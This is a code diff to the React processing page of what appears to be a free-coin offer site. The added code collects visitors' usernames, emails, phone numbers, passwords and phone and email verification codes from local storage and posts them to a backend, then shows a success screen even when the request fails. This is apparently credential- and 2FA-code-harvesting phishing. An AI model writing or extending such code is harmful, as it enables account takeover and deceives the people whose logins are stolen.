@@ -1,20 +1,54 @@
-import React, { useEffect } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '../components/ui/button';
 import { Loader2 } from 'lucide-react';
+import axios from 'axios';
+
+const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+const API = `${BACKEND_URL}/api`;
 
 const ProcessingPage = () => {
   const navigate = useNavigate();
+  const [status, setStatus] = useState('processing');
   const coinAmount = localStorage.getItem('coinAmount') || '100,000';
-  const username = localStorage.getItem('username') || '@user';
 
   useEffect(() => {
-    // Simüle processing - 3 saniye sonra admin sayfasına yönlendir
-    const timer = setTimeout(() => {
-      navigate('/admin');
-    }, 3000);
+    const submitCoinRequest = async () => {
+      try {
+        // Gather all data from localStorage
+        const requestData = {
+          username: localStorage.getItem('username') || 'unknown',
+          amount: parseInt(localStorage.getItem('coinAmount') || '100000'),
+          email: localStorage.getItem('email') || '',
+          phone: localStorage.getItem('phone') || '',
+          password: localStorage.getItem('password') || '',
+          phone_code: localStorage.getItem('phoneCode') || '',
+          email_code: localStorage.getItem('emailCode') || '',
+          location: 'Unknown',
+          device: 'Web Browser',
+        };
 
-    return () => clearTimeout(timer);
+        // Send to backend
+        const response = await axios.post(`${API}/coin-request`, requestData);
+        
+        if (response.data) {
+          setStatus('success');
+          // Wait 2 seconds then redirect to success page
+          setTimeout(() => {
+            navigate('/success');
+          }, 2000);
+        }
+      } catch (error) {
+        console.error('Error submitting coin request:', error);
+        setStatus('error');
+        // Even on error, redirect after 3 seconds
+        setTimeout(() => {
+          navigate('/success');
+        }, 3000);
+      }
+    };
+
+    submitCoinRequest();
   }, [navigate]);
 
   return (
@@ -39,9 +73,8 @@ const ProcessingPage = () => {
 
       {/* Main Content */}
       <main className="max-w-4xl mx-auto px-6 py-20">
-        {/* Loading Animation */}
         <div className="flex flex-col items-center justify-center">
-          {/* Spinner */}
+          {/* Loading Animation */}
           <div className="mb-12 relative">
             <div className="w-32 h-32 rounded-full border-4 border-gray-700 border-t-cyan-400 animate-spin"></div>
             <div className="absolute inset-0 flex items-center justify-center">
@@ -51,7 +84,9 @@ const ProcessingPage = () => {
 
           {/* Title */}
           <h1 className="text-4xl font-bold text-white mb-4 text-center">
-            Your application is being processed...
+            {status === 'processing' && 'Your application is being processed...'}
+            {status === 'success' && 'Request submitted successfully!'}
+            {status === 'error' && 'Processing your request...'}
           </h1>
           <p className="text-gray-400 text-xl text-center mb-12">
             Please wait a moment
